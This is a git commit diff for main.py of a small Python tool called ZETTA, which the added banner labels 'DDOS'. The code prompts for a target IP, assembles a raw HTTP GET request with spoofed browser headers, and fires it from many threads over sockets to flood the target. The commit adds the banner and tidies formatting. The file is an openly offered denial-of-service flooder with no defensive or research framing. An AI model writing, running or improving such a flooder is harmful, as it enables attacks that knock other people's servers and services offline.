2cb9f87c046a863c3447d82108e84790c8cd375a
kirk <122225913+kirk65@users.noreply.github.com>
2023-04-06 23:57:29 +0100

    Update main.py
    was bored so added a nice header

--- main.py
+++ main.py
@@ -1,27 +1,28 @@
 # ZETTA
-# v0.0.1
+# v0.0.2
 
 import socket
 import threading
 from colorama import Fore as F
 
+
 class Zetta:
     def __init__(self, ip):
         self.count = 0
         self.ip = ip
-        self.agent = f"User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1\r\n"
+        self.agent = f"User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1", "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1\r\n"
         self.accept = "Accept-Encoding: gzip, deflate"
         self.reffer = f"Referer: https://duckduckgo.com/?q= {self.ip}\r\n"
         self.content = "Content-Type: application/x-www-form-urlencoded\r\n"
         self.length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
         self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:80\r\n"
-        self.main_req  = f"{self.target_host} {self.agent} {self.accept} {self.reffer} {self.content} {self.length}\r\n"
+        self.main_req = f"{self.target_host} {self.agent} {self.accept} {self.reffer} {self.content} {self.length}\r\n"
         self.r = F.RED
         self.g = F.GREEN
         self.y = F.YELLOW
         self.re = F.RESET
         self.port = 80
-        
+
     def send(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,14 +30,21 @@ class Zetta:
             s.send(str.encode(self.main_req))
             self.count += 1
             print(f"{self.g}[+]{self.re} Sent packet {self.count}")
-            
+
         except Exception as e:
             if self.port == 80:
                 self.port == 443
                 self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:{self.port}\r\n"
-                
-                
+
             print(f"{self.r}[-]{self.re} Didn't send packet. Error: {e}")
+
+print(f"{F.BLUE}╔════╗╔═══╗╔════╗╔════╗╔═══╗")
+print('╚══╗ ║║╔══╝║╔╗╔╗║║╔╗╔╗║║╔═╗║')
+print('  ╔╝╔╝║╚══╗╚╝║║╚╝╚╝║║╚╝║║ ║║')
+print(' ╔╝╔╝ ║╔══╝  ║║    ║║  ║╚═╝║')
+print('╔╝ ╚═╗║╚══╗ ╔╝╚╗  ╔╝╚╗ ║╔═╗║')
+print('╚════╝╚═══╝ ╚══╝  ╚══╝ ╚╝ ╚╝')
+print(f"{F.CYAN}------------DDOS------------")
 
 def main():
     ip = str(input(f"{F.YELLOW}[?]{F.RESET} Target: "))
@@ -44,8 +52,9 @@ def main():
     zetta = Zetta(ip)
 
     for _ in range(pack):
-        t = threading.Thread(target = zetta.send)
+        t = threading.Thread(target=zetta.send)
         t.start()
-        
+
+
 if __name__ == "__main__":
     main()
